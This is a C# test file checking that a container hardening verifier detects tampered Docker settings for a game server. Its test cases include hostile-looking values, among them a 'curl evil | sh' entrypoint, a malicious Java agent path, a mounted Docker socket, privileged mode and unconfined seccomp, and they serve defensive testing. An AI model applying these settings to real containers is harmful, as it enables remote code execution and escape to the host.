using Bonfire.Core.Servers;

namespace Bonfire.Tests;

public sealed class HardeningVerifierTests
{
    private const string NetworkId = "net123";

    private static readonly ContainerSpec Spec = ContainerSpecBuilder.Build(
        ServerTestData.Vanilla(), new ServerPaths("/srv/s"), 1000, 1000, Guid.NewGuid());

    private static readonly ImageDefaults Image = new(
        new Dictionary<string, string> { ["PATH"] = "/usr/bin", ["TYPE"] = "VANILLA", ["UID"] = "1000" },
        ["/image/scripts/start"],
        [],
        "SIGTERM",
        "/data",
        "CMD-SHELL mc-health|00:00:30|||00:02:00||2");

    /// <summary>What Docker reports for a container created exactly from <see cref="Spec"/>.</summary>
    private static ObservedContainer Matching()
    {
        var env = new Dictionary<string, string>(Image.Environment);
        foreach (var (k, v) in Spec.Environment)
        {
            env[k] = v;
        }

        return new ObservedContainer(
            Image: Spec.Image,
            User: Spec.User,
            Environment: env.ToList(),
            Entrypoint: Image.Entrypoint,
            Cmd: [],
            StopSignal: "SIGTERM",
            WorkingDir: "/data",
            Healthcheck: Image.Healthcheck,
            Labels: new Dictionary<string, string>(Spec.Labels) { ["org.opencontainers.image.title"] = "x" },
            Mounts: Spec.Binds,
            Tmpfs: Spec.Tmpfs,
            Ports: [Spec.Port],
            PublishAllPorts: false,
            Networks: new Dictionary<string, string> { [Spec.NetworkName] = NetworkId },
            NetworkMode: Spec.NetworkName,
            MemoryBytes: Spec.MemoryBytes,
            MemorySwapBytes: Spec.MemorySwapBytes,
            NanoCpus: Spec.NanoCpus,
            PidsLimit: Spec.PidsLimit,
            ReadOnlyRootfs: true,
            Privileged: false,
            CapAdd: [],
            CapDrop: ["ALL"],
            SecurityOptions: ["no-new-privileges:true"],
            PidMode: "",
            IpcMode: "private",
            UtsMode: "",
            UsernsMode: "",
            CgroupnsMode: "private",
            DeviceCount: 0,
            DeviceRequestCount: 0,
            DeviceCgroupRuleCount: 0,
            SysctlCount: 0,
            VolumesFromCount: 0,
            LinkCount: 0,
            Runtime: "runc",
            OomKillDisabled: false,
            RestartPolicy: "no",
            RestartMaxRetries: 0,
            LogDriver: "json-file",
            LogOptions: new Dictionary<string, string> { ["max-size"] = "10m", ["max-file"] = "3" });
    }

    private static ObservedNetwork MatchingNetwork() => new(
        NetworkId, Spec.NetworkName, "bridge", false, false, false, false, false,
        new Dictionary<string, string>(), new Dictionary<string, string>(Spec.Labels));

    [Fact]
    public void MatchingContainerPasses() => Assert.Empty(HardeningVerifier.Verify(Spec, Image, Matching(), NetworkId));

    [Fact]
    public void NeverStartedContainerHasNoNetworkIdYet() =>
        Assert.Empty(HardeningVerifier.Verify(Spec, Image, Matching() with
        {
            Networks = new Dictionary<string, string> { [Spec.NetworkName] = "" },
        }, NetworkId));

    [Fact]
    public void MatchingNetworkPasses() => Assert.Empty(HardeningVerifier.VerifyNetwork(Spec, MatchingNetwork()));

    private static List<KeyValuePair<string, string>> Env(ObservedContainer o, string key, string value) =>
        [.. o.Environment, new(key, value)];

    public static TheoryData<string, Func<ObservedContainer, ObservedContainer>> Tamperings => new()
    {
        { "privileged", o => o with { Privileged = true } },
        { "cap add", o => o with { CapAdd = ["SYS_ADMIN"] } },
        { "caps kept", o => o with { CapDrop = [] } },
        { "no-new-privileges missing", o => o with { SecurityOptions = [] } },
        { "seccomp unconfined", o => o with { SecurityOptions = ["no-new-privileges", "seccomp=unconfined"] } },
        { "custom seccomp profile", o => o with { SecurityOptions = ["no-new-privileges", "seccomp={\"defaultAction\":\"SCMP_ACT_ALLOW\"}"] } },
        { "apparmor override", o => o with { SecurityOptions = ["no-new-privileges", "apparmor=unconfined"] } },
        { "custom runtime", o => o with { Runtime = "sysbox-runc" } },
        { "writable rootfs", o => o with { ReadOnlyRootfs = false } },
        { "root user", o => o with { User = "0:0" } },
        { "entrypoint", o => o with { Entrypoint = ["/bin/sh", "-c", "curl evil | sh"] } },
        { "cmd", o => o with { Cmd = ["--evil"] } },
        { "stop signal SIGKILL", o => o with { StopSignal = "SIGKILL" } },
        { "healthcheck", o => o with { Healthcheck = "CMD true|||||" } },
        { "healthcheck retries", o => o with { Healthcheck = "CMD-SHELL mc-health|00:00:30|||00:02:00||999" } },
        { "publish all ports", o => o with { PublishAllPorts = true } },
        { "java agent env", o => o with { Environment = Env(o, "JAVA_TOOL_OPTIONS", "-javaagent:/data/evil.jar") } },
        { "duplicate env", o => o with { Environment = Env(o, "STOP_DURATION", "0") } },
        { "env changed", o => o with { Environment = o.Environment.Select(kv => kv.Key == "STOP_DURATION" ? new KeyValuePair<string, string>(kv.Key, "60") : kv).ToList() } },
        { "docker socket mounted", o => o with { Mounts = [.. o.Mounts, new BindMount("/var/run/docker.sock", "/var/run/docker.sock", false)] } },
        { "home mounted", o => o with { Mounts = [new BindMount("/home", "/data", false), o.Mounts[1]] } },
        { "port on all interfaces", o => o with { Ports = [o.Ports[0] with { HostIp = "0.0.0.0" }] } },
        { "udp instead of tcp", o => o with { Ports = [o.Ports[0] with { Protocol = "udp" }] } },
        { "rcon published", o => o with { Ports = [.. o.Ports, new PortBinding(25575, "tcp", "127.0.0.1", 25575)] } },
        { "extra network", o => o with { Networks = new Dictionary<string, string>(o.Networks) { ["bridge"] = "b" } } },
        { "replaced network", o => o with { Networks = new Dictionary<string, string> { [Spec.NetworkName] = "other" } } },
        { "network mode host", o => o with { NetworkMode = "host" } },
        { "host pid", o => o with { PidMode = "host" } },
        { "host ipc", o => o with { IpcMode = "host" } },
        { "host uts", o => o with { UtsMode = "host" } },
        { "host userns", o => o with { UsernsMode = "host" } },
        { "host cgroupns", o => o with { CgroupnsMode = "host" } },
        { "device", o => o with { DeviceCount = 1 } },
        { "gpu request", o => o with { DeviceRequestCount = 1 } },
        { "device cgroup rule", o => o with { DeviceCgroupRuleCount = 1 } },
        { "sysctl", o => o with { SysctlCount = 1 } },
        { "volumes from", o => o with { VolumesFromCount = 1 } },
        { "oom killer off", o => o with { OomKillDisabled = true } },
        { "swap", o => o with { MemorySwapBytes = -1 } },
        { "memory", o => o with { MemoryBytes = 0 } },
        { "pids", o => o with { PidsLimit = 0 } },
        { "image", o => o with { Image = "itzg/minecraft-server:latest" } },
        { "label", o => o with { Labels = new Dictionary<string, string>() } },
        { "restart always", o => o with { RestartPolicy = "always" } },
        { "restart retries", o => o with { RestartMaxRetries = 7 } },
        { "log rotation removed", o => o with { LogOptions = new Dictionary<string, string>() } },
        { "log driver", o => o with { LogDriver = "local" } },
        { "tmpfs exec", o => o with { Tmpfs = new Dictionary<string, string> { ["/tmp"] = "rw,size=256m" } } },
    };

    [Theory]
    [MemberData(nameof(Tamperings))]
    public void TamperingIsDetected(string name, Func<ObservedContainer, ObservedContainer> tamper)
    {
        Assert.NotEmpty(HardeningVerifier.Verify(Spec, Image, tamper(Matching()), NetworkId));
        _ = name;
    }

    public static TheoryData<string, Func<ObservedNetwork, ObservedNetwork>> NetworkTamperings => new()
    {
        { "gateway mode option", n => n with { Options = new Dictionary<string, string> { ["com.docker.network.bridge.gateway_mode_ipv4"] = "nat-unprotected" } } },
        { "driver", n => n with { Driver = "macvlan" } },
        { "attachable", n => n with { Attachable = true } },
        { "ipv6", n => n with { EnableIpv6 = true } },
        { "labels", n => n with { Labels = new Dictionary<string, string>() } },
        { "name", n => n with { Name = "bridge" } },
    };

    [Theory]
    [MemberData(nameof(NetworkTamperings))]
    public void NetworkTamperingIsDetected(string name, Func<ObservedNetwork, ObservedNetwork> tamper)
    {
        Assert.NotEmpty(HardeningVerifier.VerifyNetwork(Spec, tamper(MatchingNetwork())));
        _ = name;
    }
}
